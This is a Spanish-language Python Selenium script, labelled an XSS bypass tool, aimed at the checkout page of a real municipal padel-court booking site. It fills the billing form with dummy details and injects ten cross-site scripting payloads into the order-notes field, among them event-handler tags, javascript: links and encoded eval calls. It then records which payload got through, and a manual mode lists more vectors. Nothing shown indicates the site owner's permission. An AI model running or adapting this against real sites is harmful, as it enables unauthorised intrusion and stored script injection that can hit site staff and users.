from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

def configurar_driver():
    chrome_options = Options()
    chrome_options.add_argument("--disable-web-security")
    chrome_options.add_argument("--window-size=1280,720")
    driver = webdriver.Chrome(options=chrome_options)
    return driver

# Diferentes vectores XSS para bypass de filtros
vectores_bypass = {
    "1. IMG con onerror": '<img src=x onerror=alert("XSS_IMG")>',
    "2. SVG con onload": '<svg onload=alert("XSS_SVG")>',
    "3. Input con onfocus": '<input onfocus=alert("XSS_INPUT") autofocus>',
    "4. Body con onload": '<body onload=alert("XSS_BODY")>',
    "5. Iframe con src javascript": '<iframe src="javascript:alert(\'XSS_IFRAME\')">',
    "6. Script con caracteres unicode": '<script>alert(String.fromCharCode(88,83,83))</script>',
    "7. Div con onmouseover": '<div onmouseover=alert("XSS_DIV")>Pasa el ratón aquí</div>',
    "8. A con href javascript": '<a href="javascript:alert(\'XSS_LINK\')">Click aquí</a>',
    "9. Script con encoding": '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
    "10. Video con onerror": '<video onerror=alert("XSS_VIDEO")><source>'
}

def probar_bypass():
    print("="*60)
    print("🚨 BYPASS DE FILTROS XSS")
    print("="*60)
    
    driver = configurar_driver()
    
    try:
        print("Navegando a la página...")
        driver.get("https://www.horcajodesantiago.es/reserva-pistas/pista-de-padel/")
        time.sleep(3)
        
        print("\nAsegúrate de tener una reserva en el carrito")
        input("Presiona Enter cuando tengas algo en el carrito...")
        
        print("\nVectores de bypass disponibles:")
        for key, vector in vectores_bypass.items():
            print(f"{key}: {vector}")
        
        while True:
            try:
                opcion = input("\nElige vector (1-10) o 'q' para salir: ")
                
                if opcion.lower() == 'q':
                    break
                
                if opcion in [str(i) for i in range(1, 11)]:
                    vector_key = list(vectores_bypass.keys())[int(opcion)-1]
                    vector = vectores_bypass[vector_key]
                    
                    print(f"\nProbando: {vector_key}")
                    print(f"Vector: {vector}")
                    
                    # Ve a finalizar compra
                    driver.get("https://www.horcajodesantiago.es/reserva-pistas/carrito/finalizar-compra/")
                    time.sleep(3)
                    
                    wait = WebDriverWait(driver, 10)
                    
                    try:
                        campo_notas = wait.until(EC.presence_of_element_located((By.NAME, "order_comments")))
                        
                        # Rellena campos básicos
                        driver.find_element(By.NAME, "billing_first_name").clear()
                        driver.find_element(By.NAME, "billing_first_name").send_keys("Bypass")
                        
                        driver.find_element(By.NAME, "billing_last_name").clear()
                        driver.find_element(By.NAME, "billing_last_name").send_keys("Test")
                        
                        driver.find_element(By.NAME, "billing_phone").clear()
                        driver.find_element(By.NAME, "billing_phone").send_keys("987654321")
                        
                        driver.find_element(By.NAME, "billing_email").clear()
                        driver.find_element(By.NAME, "billing_email").send_keys("bypass@test.com")
                        
                        # Inyecta el vector
                        campo_notas.clear()
                        campo_notas.send_keys(vector)
                        
                        print("✓ Vector inyectado!")
                        
                        # Marca términos
                        try:
                            terminos = driver.find_element(By.NAME, "terms")
                            if not terminos.is_selected():
                                terminos.click()
                                print("✓ Términos marcados")
                        except:
                            print("- No se encontró casilla de términos")
                        
                        print("\n🎯 INSTRUCCIONES:")
                        print("1. Ve al navegador")
                        print("2. Haz clic en 'REALIZAR LA RESERVA'")
                        print("3. Observa si aparece una alerta")
                        print("4. Si aparece alerta = BYPASS EXITOSO!")
                        
                        resultado = input("\n¿Apareció la alerta? (s/n): ")
                        
                        if resultado.lower() in ['s', 'si', 'yes', 'y']:
                            print("🎉 ¡BYPASS EXITOSO!")
                            print(f"Vector que funcionó: {vector}")
                            
                            # Guarda el vector exitoso
                            with open("vector_exitoso.txt", "w") as f:
                                f.write(f"Vector exitoso: {vector}\n")
                                f.write(f"Descripción: {vector_key}\n")
                                f.write(f"Fecha: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                            
                            print("✓ Vector guardado en 'vector_exitoso.txt'")
                        else:
                            print("❌ Vector bloqueado")
                        
                    except Exception as e:
                        print(f"Error: {e}")
                        print("Asegúrate de tener algo en el carrito")
                
                else:
                    print("Opción no válida")
                    
            except Exception as e:
                print(f"Error: {e}")
                
    except Exception as e:
        print(f"Error general: {e}")
    
    input("\nPresiona Enter para cerrar...")
    driver.quit()

# Función adicional para probar vectores manuales
def probar_manual():
    print("\n" + "="*60)
    print("🔧 MODO MANUAL - Prueba tus propios vectores")
    print("="*60)
    
    driver = configurar_driver()
    
    try:
        driver.get("https://www.horcajodesantiago.es/reserva-pistas/carrito/finalizar-compra/")
        
        print("El navegador está abierto.")
        print("Rellena manualmente el formulario y prueba estos vectores:")
        print()
        print("• <img src=x onerror=alert(1)>")
        print("• <svg onload=alert(1)>")
        print("• <input onfocus=alert(1) autofocus>")
        print("• javascript:alert(1)")
        print("• &#60;script&#62;alert(1)&#60;/script&#62;")
        
        input("\nPresiona Enter para cerrar cuando termines...")
        
    except Exception as e:
        print(f"Error: {e}")
    
    driver.quit()

if __name__ == "__main__":
    print("🎯 HERRAMIENTA DE BYPASS XSS")
    print("Elige modo:")
    print("1. Automatizado - Prueba vectores predefinidos")
    print("2. Manual - Prueba tus propios vectores")
    
    modo = input("Modo (1/2): ")
    
    if modo == "1":
        probar_bypass()
    elif modo == "2":
        probar_manual()
    else:
        print("Opción no válida")
